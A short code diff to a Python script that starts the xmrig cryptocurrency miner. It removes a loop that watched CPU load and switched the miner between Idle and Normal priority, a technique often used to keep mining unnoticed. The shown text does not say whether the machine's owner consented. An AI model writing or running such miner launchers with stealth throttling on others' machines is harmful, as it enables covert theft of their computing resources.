@@ -25,27 +25,5 @@ def main():
     # Start the xmrig.exe process immediately
     subprocess.Popen([xmrig_path])
 
-    process_name = "xmrig.exe"
-    high_usage_threshold = 75
-    low_usage_threshold = 25
-
-    while True:
-        cpu_usage = subprocess.check_output(["wmic", "cpu", "get", "loadpercentage"]).decode("utf-8").split()[1]
-        cpu_usage = int(cpu_usage)
-        
-        if cpu_usage >= high_usage_threshold:
-            for proc in subprocess.check_output(["tasklist"]).decode("utf-8").splitlines():
-                if process_name in proc:
-                    pid = int(proc.split()[1])
-                    set_process_priority(pid, "Idle")
-
-        elif cpu_usage < low_usage_threshold:
-            for proc in subprocess.check_output(["tasklist"]).decode("utf-8").splitlines():
-                if process_name in proc:
-                    pid = int(proc.split()[1])
-                    set_process_priority(pid, "Normal")
-
-        time.sleep(5)
-
 if __name__ == "__main__":
     main()
